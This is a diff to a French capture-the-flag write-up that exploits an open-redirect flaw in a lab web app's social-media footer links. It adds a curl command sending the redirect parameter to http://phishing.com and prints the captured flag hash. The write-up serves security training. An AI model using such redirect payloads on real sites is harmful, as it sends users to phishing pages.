@@ -3,12 +3,20 @@
 ## Exploitation
 
 Sur le bas de page on peux voir les redirections vers twitter - facebook - instagram.
-On peux changer ces redirections n inspectant le code de la page ou directement dans l'url puisque la redirection est une requete GET 
+On peux changer ces redirections en inspectant le code de la page ou directement dans l'url puisque la redirection est une requete GET 
 
 Un exemple de redirection vers http://phishing.com :
 
 ```url
 	http://192.168.122.55/index.php?page=redirect&site=http://phishing.com
+```
+
+avec curl :
+
+```bash
+$> curl http://192.168.99.100/index.php\?page\=redirect\&site\=http://phishing.com | grep flag
+
+Good Job Here is the flag : b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3
 ```
 
 ## Resolution 
